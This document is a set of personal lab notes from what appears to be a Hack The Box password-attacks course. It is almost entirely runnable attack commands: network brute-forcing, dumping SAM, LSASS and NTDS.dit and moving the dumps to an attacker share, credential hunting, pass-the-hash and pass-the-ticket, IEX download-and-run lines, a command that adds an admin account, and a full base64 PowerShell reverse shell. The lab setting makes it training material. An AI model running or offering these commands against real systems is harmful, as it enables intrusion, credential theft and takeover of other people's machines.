## Remote Password Attacks
#### Network Services
```shell-session
## WinRM
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

crackmapexec winrm 10.129.42.197 -u user.list -p password.list

evil-winrm -i <target-IP> -u <username> -p <password>

evil-winrm -i 10.129.42.197 -u user -p password

## SSH
hydra -L user.list -P password.list ssh://10.129.42.197

ssh user@10.129.42.197

## Remote Desktop Protocol (RDP)
hydra -L user.list -P password.list rdp://10.129.42.197

xfreerdp /v:<target-IP> /u:<username> /p:<password>

xfreerdp /v:10.129.42.197 /u:user /p:password

## SMB
hydra -L user.list -P password.list smb://10.129.42.197
->  error

msfconsole -q
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run

crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares

smbclient -U user \\\\10.129.42.197\\SHARENAME

// Questions
sudo nmap -sV -sC 10.129.214.35 -oN host_output

crackmapexec winrm 10.129.214.35 -u username.list -p password.list

evil-winrm -i 10.129.214.35 -u username.list -p password.list

hydra -L username.list -P password.list ssh://10.129.214.35

hydra -L username.list -P password.list rdp://10.129.214.35
```

#### Password Mutations
```shell-session
cat password.list

cat custom.rule

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
cat mut_password.list

ls /usr/share/hashcat/rules/

cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

wc -l inlane.wordlist

// Questions


hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

hydra -l sam -P mut_password.list ftp://10.129.202.64 -t 64
```

#### Password Reuse / Default Passwords
```
hydra -C <user_pass.list> <protocol>://<IP>

hydra -C user_pass.list ssh://10.129.42.197

// Questions:
creds search mssql
```


## Windows Local Password Attacks
#### Attacking SAM
```cmd-session
## Attacking SAM

C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
or
sudo python -m uploadserver

C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
or
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.28:8000/PSUpload.ps1')

PS C:\htb> Invoke-FileUpload -Uri http://10.10.16.28:8000/upload -File C:\sam.save
// similarly with security.save and system.save

ls

## Dumping Hashes with Impacket's Secretdump.py

locate secretsdump 

secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

## Cracking Hashes with Hashcat

sudo vim hashestocrack.txt

sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

## Remote Dumping & LSA Secrets Considerations

crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

// Questions

reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

move sam.save \\10.10.14.4\CompData
move security.save \\10.10.14.4\CompData
move system.save \\10.10.14.4\CompData

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
or
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

sudo hashcat -m 1000 hashtocrack.txt /usr/share/wordlists/rockyou.txt

crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Attacking LSASS
```cmd-session
## Dumping LSASS Process Memory

- Task manager method (CNG key, Credential..., Security...)
-> Dumped file in C:\Users\loggedonusersdirectory\AppData\Local\Temp

C:\Windows\system32> tasklist /svc

PS C:\Windows\system32> Get-Process lsass

PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

## Using Pypkatz to extract credential

pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

python -m uploadserver

sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

// Questions
Get-Process lsass

rundll32 C:\windows\system32\comsvcs.dll, MiniDump 668 C:\lsass.dmp full

move C:\lsass.DMP \\10.10.15.96\CompData

pypykatz lsa minidump ./lsass.DMP

sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
-> Mic@123
```

#### Attacking Active Directory & NTDS.dit
```shell-session

## Dictionary Attacks against AD accounts using CrackMapExec

cat usernames.txt 

./username-anarchy -i /home/ltnbob/names.txt 

crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

## Caputuring NTDS.dit

evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'

*Evil-WinRM* PS C:\> net localgroup

*Evil-WinRM* PS C:\> net user bwilliamson

*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

## Cracking Hashes & Gaining Credentials

sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"

// Questions
crackmapexec smb 10.129.202.85 -u employee_output -p /usr/share/wordlists/fasttrack.txt

crackmapexec smb 10.129.202.85 -u jmarston -p P@ssword! --ntds
```

#### Credential Hunting in Windows
```cmd-session
- Windows search on password/sensitive key term

C:\Users\bob\Desktop> start .\lazagne.exe all

C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

// Questions
- Windows search password:
	-> WellConnected123
- Look at desktop file of gitlab
	-> 3z1ePfGbjWPsTfCsZfjy


certutil -urlcache -split -f "http://10.10.16.28:8000/LaZagne.exe" 
-> ubuntu:FSadmin123
-> root:Gitadmin123

Look deeper into the document (quick access) related folders
	-> Inlanefrieghtisgreat2022
	
Looked at the script file, saw an ansible script 
	-> edgeadmin:Edge@dmin123!
```

## Linux Local Password Attacks
#### Credential Hunting in Linux
```shell-session
## Files

for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

find /home/* -type f -name "*.txt" -o ! -name "*.*"

for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

cat /etc/crontab 

ls -la /etc/cron.*/

grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

## History

tail -n5 /home/*/.bash*
cat /home/*/.bash*  (for a more complete look)

for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

## Memory and Cache

sudo python3 mimipenguin.py

sudo bash mimipenguin.sh 

sudo python2.7 laZagne.py all

ls -l .mozilla/firefox/ | grep default 

cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

python3.9 firefox_decrypt.py
	
python3 laZagne.py browsers

// Questions

hydra -t 64 -l kira -P password.list ftp://10.129.67.161
	->kira:L0vey0u1!

...after trials above all failed:
ls -l .mozilla/firefox/ | grep default 
cat .mozilla/firefox/ytb95ytb.default-release/logins.json | jq .
-> Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```

#### Passwd, Shadow & Opasswd
```shell-session
## Passwd File

- Editing /etc/passwd

head -n 1 /etc/passwd

su

## Shadow File

sudo cat /etc/shadow

## Opasswd

sudo cat /etc/security/opasswd

## Cracking Linux Credentials

areaeric@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
areaeric@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
areaeric@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

cat md5-hashes.list

hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

// Questions
- Check for hidden files, saw backups folder

- Obtained password.bak, shadow.bak from backup

hashcat -m 1800 -a 0 sha512-hashes.list mut_password.list 
```

## Windows lateral movement
#### Pass the Hash (PtH)
```cmd-session

## Pass the Hash with Mimikatz (Windows)

c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
-> Note: MUST be run in interactive mode (remember to translate), but we put the non-interactive mode here for convenience. 

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

PS C:\tools> .\nc.exe -lvnp 8001

PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAg...
- Powershell reverse shell from https://www.revshells.com/

## Pass the Hash with Impacket (Linux)

impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

## Pass the Hash with CrackMapExec (Linux)

crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

## Pass the Hash with evil-winrm (Linux)

areaeric@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

**Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

## Pass the Hash with RDP (Linux)

xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

// Questions:

impacket-psexec administrator@10.129.204.23 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /v:10.129.204.23 /tls-seclevel:0 /timeout:80000 /d:. 

.\mimikatz.exe 
privilege::debug 
sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe
// Repeat for john

.\nc.exe -lvnp 8002

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

#### Pass the Ticket (PtT) from Windows
```cmd-session
## Harvesting Kerberos Tickets from Windows

c:\tools> .\mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit

c:\tools> dir *.kirbi

c:\tools> Rubeus.exe dump /nowrap

**Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

## Pass the Key or OverPass the Hash

c:\tools> .\mimikatz.exe privilege::debug "sekurlsa::ekeys /export" exit

c:\tools> .\mimikatz.exe privilege::debug sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

**Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."

## Pass the Ticket (PtT)

c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/

## Mimikatz - PowerShell Remoting with Pass the Ticket

C:\tools> mimikatz.exe privilege::debug "kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" exit

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john

## Rubeus - PowerShell Remoting with Pass the Ticket

C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

// Questions
.\mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit

dir *.kirbi

johnL
aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
ntlm: c4b0e1b10c7ce2c4723b4e2407ef81a2

c:\tools> .\mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2"
dir \\DC01.inlanefreight.htb\john

Enter-PSSession -ComputerName DC01

more C:\john\john.txt
// play 

// play
Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt

mimikatz.exe 
privilege::debug 
kerberos::ptt "C:\tools\[0;5376a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi" 
exit
```

#### Pass the Ticket (PtT) from Linux
```
**Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

**Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

## Identifying Linux and Active Directory Integration

david@inlanefreight.htb@linux01:~$ realm list

ps -ef | grep -i "winbind\|sssd"

## Finding Keytab Files

find / -name *keytab* -ls 2>/dev/null

crontab -l

**Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

## Finding ccache Files

env | grep -i krb5

ls -la /tmp

## Abusing KeyTab Files

klist -k -t 

**Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

klist 

kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist

smbclient //dc01/carlos -k -c ls

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

su - carlos@inlanefreight.htb

## Abusing Keytab ccache

ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222

sudo -l

sudo su

ls -la /tmp

id julio@inlanefreight.htb

klist

cp /tmp/krb5cc_647401106_I8I133 .

export KRB5CCNAME=/root/krb5cc_647401106_I8I133

klist

smbclient //dc01/C$ -k -c ls -no-pass

**Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

## Using Linux Attack Tools with Kerberos

cat /etc/hosts

cat /etc/proxychains.conf

areaeric@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
areaeric@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
areaeric@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
areaeric@htb[/htb]$ sudo ./chisel server --reverse 

xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution

c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

**Note:** The client IP is your attack host IP.
- Or, we can and will use ligolo with the same idea. 

export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

proxychains impacket-wmiexec dc01 -k

sudo apt-get install krb5-user -y

cat /etc/krb5.conf

proxychains evil-winrm -i dc01 -r inlanefreight.htb

impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

areaeric@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
areaeric@htb[/htb]$ /opt/linikatz.sh

// Questions
realm list

find / -name *keytab* 2>/dev/null
klist -k -t /opt/specialfiles/carlos.keytab
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
-> Password5

su - carlos@inlanefreight.htb
Password5

find / -name *keytab* -ls 2>/dev/null

crontab -l

klist -k -t svc_workstations._all.kt

python3 /opt/keytabextract.py svc_workstations._all.kt
-> password4

su svc_workstations@inlanefreight.htb
-> Password4

sudo -l
sudo su

ls -la /tmp

klist krb5cc_647401106_HRJDux
klist krb5cc_647401106_JYmtkS

cp /tmp/krb5cc_647401106_JYmtkS .

export KRB5CCNAME=/root/krb5cc_647401106_JYmtkS

smbclient //dc01/C$ -k -c ls -no-pass
smbclient //dc01/julio -k -c ls -no-pass

ls -la /tmp

klist -k -t /etc/krb5.keytab

kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab 

smbclient //dc01/linux01 -k -c ls -no-pass

smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass
```

## Cracking Files
#### Protected Files
```shell-session
## Hunting for Encoded Files

for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

cat /home/cry0l1t3/.ssh/SSH.private

## Cracking with John

locate *2john*

ssh2john.py SSH.private > ssh.hash
cat ssh.hash 

john --wordlist=rockyou.txt ssh.hash

john ssh.hash --show

## Cracking Documents

office2john.py Protected.docx > protected-docx.hash
cat protected-docx.hash

john --wordlist=rockyou.txt protected-docx.hash

john protected-docx.hash --show

pdf2john.py PDF.pdf > pdf.hash
cat pdf.hash 

john --wordlist=rockyou.txt pdf.hash

john pdf.hash --show

//Questions
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

cat /home/cry0l1t3/.ssh/SSH.private

ssh2john.py id_rsa > ssh.hash

john --wordlist=rockyou.txt ssh.hash
```

#### Protected Archives
```shell-session
## Cracking Archives/ZIP

curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

zip2john ZIP.zip > zip.hash

cat zip.hash 

john --wordlist=rockyou.txt zip.hash

john zip.hash --show

## Cracking OpenSSL Encrypted Archives

ls

file GZIP.gzip 

for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

## Cracking BitLocker Encrypted Drives

areaeric@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
areaeric@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
areaeric@htb[/htb]$ cat backup.hash

hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

cat backup.cracked 
```

## Skills

#### Password Attacks Lab - Easy
```
sudo nmap 10.129.202.221 
sudo nmap -p- 10.129.202.221 
sudo nmap -sV 10.129.202.221 

hydra -t 64 -L username.list -P mut_password.list ftp://10.129.202.219
-> mike:7777777

ftp 10.129.202.129

get id_rsa

python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john id_rsa.hash --show
7777777
or
password-reuse attack
-> 7777777
chmod 500 id_rsa

ssh mike@10.129.202.219 -i id_rsa

cat /home/*/.bash* 
-> analysis.py -u root -p dgb6fzm0ynk@AME9pqu

sudo su
```

Password Attacks Lab - Medium
```
sudo nmap 10.129.202.221
sudo nmap -p- 10.129.202.221

sudo nmap -sVC -p22,139,445 10.129.202.221

smbmap -H 10.129.202.221
smbclient -U "" \\\\10.129.202.221\\SHAREDRIVE

ls
get Docs.zip
unzip Docs.zip

zip2john Docs.zip > Docs.hash
john --wordlist=/usr/share/wordlists/rockyou.txt Docs.hash
john Docs.hash --show
-> failed.

john --wordlist=~/Desktop/htb/others/password_related/mut_password.list Docs.hash
-> Destiny2022!

unzip Docs.zip


python3 /usr/share/john/office2john.py Documentation.docx > Documentation-docx.hash
cat documentation-docx.hash

john --wordlist=/usr/share/wordlists/rockyou.txt Documentation-docx.hash
john Documentation-docx.hash --show
-> Documentation.docx:987654321

Examine Documentation
-> jason:C4mNKjAtL2dydsYa6
-> http://localhost:8080/cms, http://localhost:8080/

ssh jason@10.129.202.221

cat /root/flag.txt
-> permission denied

netstat -tunlp (observe service running internally)

mysql -u jason -pC4mNKjAtL2dydsYa6 -h 127.0.0.1
mysql> SHOW DATABASES;
	
mysql> USE users;
mysql> SHOW TABLES;
mysql> SELECT * FROM creds;

SELECT * FROM creds
where name="root";
-> nothing
-> keep track of password creds database.

for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
find /home/* -type f -name "*.txt" -o ! -name "*.*"
-> find: ‘/home/dennis/.ssh’: Permission denied

- creds of dennis come handy from previous information gathering.
->  101 | dennis| 7AUgWWQEiMPdqx 
special username:password pair

su dennis
-> Doesn't work?
ssh dennis@10.129.202.221

history
-> SSH file being generated.
-> Series of command seems suspicious (creating SSH key, changing password, maybe an admin is doing this).

dennis@skills-medium:~/.ssh$ python3 -m http.server

wget http://10.129.202.221:8000/id_rsa

python3 /usr/share/john/ssh2john.py id_rsa.1 > ssh1.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh1.hash
-> crack fail

john --wordlist=~/Desktop/htb/others/exercises_related/password_attacks/mut_password.list ssh1.hash
-> P@ssw0rd12020!

ssh dennis@10.129.202.221 -i id_rsa.1
-> success

ssh root@10.129.202.221 -i id_rsa.1
-> Success
```

Password Attacks Lab - Hard
```
sudo nmap 10.129.202.222
-> -p111,135,139,445,2049,3389
sudo nmap -p- 10.129.202.222


showmount -e 10.129.202.222
-> nothing, so ignore

sudo mount -t nfs 10.129.202.222:/ ./target-NFS/ -o nolock\

smbclient -N -L //10.129.202.222

smbmap -H //10.129.202.222

smbmap -u Johanna -H //10.129.202.222

smbclient -U "Johanna" -L //10.129.202.222

hydra -t 64 -l Johanna -P mut_password.list smb://10.129.202.222

crowbar -b rdp -s 10.129.202.222/32 -u "johanna" -C mut_password.list
-> 1231234!

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:Johanna /p:'1231234!' /v:10.129.202.222 /tls-seclevel:0 /timeout:80000
-> look around find keePass Database file

python -m http.server
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.28:8000/PSUpload.ps1')

python -m uploadserver
Invoke-FileUpload -Uri http://10.10.16.28:8000/upload -File Logins.kdbx

file Logins.kdbx
-> keepass file

locate *2john* | grep "keepass"
-> keepass2john

keepass2john Logins.kdbx > Logins.hash
cat Logins.hash
john --wordlist=/usr/share/wordlists/rockyou.txt Logins.hash
john Logins.hash --show
-> Logins:Qwerty7!

login to keepass
-> david:gRzX7YbeTcDG7

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:david /p:'gRzX7YbeTcDG7' /v:10.129.202.222 /tls-seclevel:0 /timeout:80000
-> connection failed

smbmap -u david -p gRzX7YbeTcDG7 -H 10.129.202.222
-> david can read

smbclient -U david \\\\10.129.202.222\\david
get Backup.vhd

bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
hashcat -m 22100 backup.hash /usr/share/wordlists/rockyou.txt -o backup.cracked
hashcat -m 22100 backup.hash /usr/share/wordlists/rockyou.txt --show
-> 123456789!

modprobe nbd
qemu-nbd -c /dev/nbd0 Backup.vhd
-> ignore error
sudo cryptsetup bitlkOpen /dev/nbd0p2 eric
-> enter password

mkdir vhd
sudo mount /dev/mapper/eric vhd/

cd vhd/
-> SAM and SYSTEM

secretsdump.py -sam SAM -system SYSTEM LOCAL
